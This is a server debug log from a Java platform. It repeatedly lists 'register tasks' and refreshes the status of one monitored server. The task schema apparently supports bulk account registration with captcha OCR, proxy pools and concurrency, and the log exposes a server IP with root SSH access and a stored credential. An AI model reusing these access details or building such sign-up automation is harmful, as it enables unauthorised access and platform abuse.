2025-11-20 10:24:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:24:39 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:42 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:52 [http-nio-8080-exec-8] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:02 [http-nio-8080-exec-9] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:06 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:25:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:25:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:25:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 3.1(BigDecimal), 3.58072(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:25:09.226552031(LocalDateTime), 2(Long)
2025-11-20 10:25:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:25:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 3.1%, 内存: 3.58072%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:25:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:25:09 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:12 [http-nio-8080-exec-10] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:22 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:32 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:36 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:25:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:25:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:25:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 1.5(BigDecimal), 3.60799(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:25:39.285277028(LocalDateTime), 2(Long)
2025-11-20 10:25:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:25:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 1.5%, 内存: 3.60799%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:25:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:25:39 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:42 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:25:52 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:02 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:06 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:26:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:26:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:26:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 1.6(BigDecimal), 3.57671(BigDecimal), 5(BigDecimal), 1(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:26:09.262585605(LocalDateTime), 2(Long)
2025-11-20 10:26:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:26:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 1.6%, 内存: 3.57671%, 磁盘: 5%, 网络: 1/0 KB/s
2025-11-20 10:26:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:26:09 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:12 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:22 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:22 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /actuator/health
2025-11-20 10:26:22 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /actuator/health
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:32 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:36 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:26:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:26:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
